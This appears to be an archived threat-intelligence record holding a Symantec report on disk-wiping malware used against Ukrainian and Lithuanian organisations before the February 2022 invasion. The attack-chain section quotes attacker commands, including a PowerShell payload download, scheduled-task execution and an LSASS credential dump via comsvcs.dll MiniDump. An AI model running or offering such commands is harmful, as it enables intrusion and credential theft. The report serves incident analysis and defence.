{
    "id": "ec5fae42-ebf7-4233-b894-36e6b256731e",
    "created_at": "2022-10-25T16:48:17.482971Z",
    "updated_at": "2025-03-27T02:06:12.758751Z",
    "deleted_at": null,
    "sha1_hash": "63e5676ff2013e825dc31e0631369dd466bc4599",
    "title": "Ukraine: Disk-wiping Attacks Precede Russian Invasion",
    "authors": "Symantec",
    "file_creation_date": "2022-02-24T22:54:57Z",
    "file_modification_date": "2022-02-24T22:54:57Z",
    "file_size": 87548,
    "plain_text": "# Ukraine: Disk-wiping Attacks Precede Russian Invasion\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia)**\n\n**UPDATE February 24, 2022, 13:42: This blog has been updated with details about ransomware being used as a**\n_possible decoy during some wiper attacks._\n\nA new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the\n[launch of a Russian invasion this morning (February 24). Symantec, a division of Broadcom Software, has also found](https://software.broadcom.com/)\nevidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial,\ndefense, aviation, and IT services sectors.\n\nTrojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd.\nIt contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource\nsection. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the\ncorresponding file according to the operating system (OS) version of the infected system. Driver file names are\ngenerated using the Process ID of the wiper\n\nOnce run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The\nwiper does not appear to have any additional functionality beyond its destructive capabilities.\n\n## Attack chain\n\nInitial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to\npotentially related malicious activity beginning as early as November 2021. However, we are continuing to review and\nverify findings.\n\nIn the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network\non December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed\nby credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23.\n\nAn organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers\nmay have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was used to\ndownload a JPEG file from an internal server, on the victim’s network.\n\ncmd.exe /Q /c powershell -c \"(New-Object\nSystem.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\"\n1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1\n\nA minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on a\nWednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task.\n\ncmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1\nCSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1\nschtasks /run /tn \"\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\"\n\nNine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time\ninstead.\n\nBeginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform the\nfollowing:\n\nExecute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com\nExecute a PowerShell command to download another JPEG file from a compromised web server confluence[.]novus[.]ua\n\n\n-----\n\nFollowing this activity, PowerShell was used to dump credentials from the compromised machine:\n\ncmd.exe /Q /c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600\nC:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072\n2>&1\n\nLater, following the above activity, several unknown PowerShell scripts were executed.\n\npowershell -v 2 -exec bypass -File text.ps1\npowershell -exec bypass gp.ps1\npowershell -exec bypass -File link.ps1\n\nFive minutes later, the wiper (Trojan.KillDisk) was deployed.\n\n## Ransomware decoy\n\nIn several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations at\nthe same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names used\nby the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe. It appears likely that the\nransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier\nWhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/0rgnnq0iav3fb7nrpfutf3pynwbpqsv2"
    ],
    "report_names": [
        "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1645743297,
    "ts_modification_date": 1645743297,
    "files": {
        "pdf": "https://archive.orkl.eu/63e5676ff2013e825dc31e0631369dd466bc4599.pdf",
        "text": "https://archive.orkl.eu/63e5676ff2013e825dc31e0631369dd466bc4599.txt",
        "img": "https://archive.orkl.eu/63e5676ff2013e825dc31e0631369dd466bc4599.jpg"
    }
}